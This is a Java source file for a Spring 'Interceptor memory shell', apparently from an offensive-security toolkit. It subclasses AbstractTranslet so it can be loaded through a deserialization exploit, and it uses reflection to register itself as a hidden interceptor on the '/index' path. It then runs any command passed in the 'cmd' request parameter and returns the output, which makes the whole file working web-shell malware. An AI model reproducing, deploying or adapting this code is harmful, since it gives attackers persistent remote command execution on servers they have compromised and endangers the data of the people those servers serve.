package com.threed.shell.spring;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.lang.Nullable;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.MappedInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

/**
 * @className: SpringInterceptorInject
 * @description: Interceptor 型内存马
 * @author: two_day
 * @date: 2022/5/28
 **/

public class SpringInterceptorInject extends AbstractTranslet implements HandlerInterceptor{

    static {
        try{
            //根据业务修改
            String[] include = {"/index"};
            String[] exclude = {""};

            //1. 获取当前应用的上下文
            HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(request);
            //2. 通过context 获得RequestMappingHandlerMapping对象
            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

            Field f = mapping.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adaptedInterceptors");
            f.setAccessible(true);
            List<HandlerInterceptor> list = (List<HandlerInterceptor>) f.get(mapping);
            //3. 获取MappedInterceptor
            MappedInterceptor mappedInterceptor = new MappedInterceptor(include, exclude, new SpringInterceptorInject());
            list.add(mappedInterceptor);
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            assert response != null;
            response.getWriter().write("Interceptor inject success");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception {

        String cmd = request.getParameter("cmd");
        if (cmd != null && response != null){
            Process process = Runtime.getRuntime().exec(cmd);
            Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");;
            String output = s.hasNext() ? s.next() : "";
            PrintWriter writer = response.getWriter();
            writer.write(output);
            writer.flush();
            writer.close();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

}
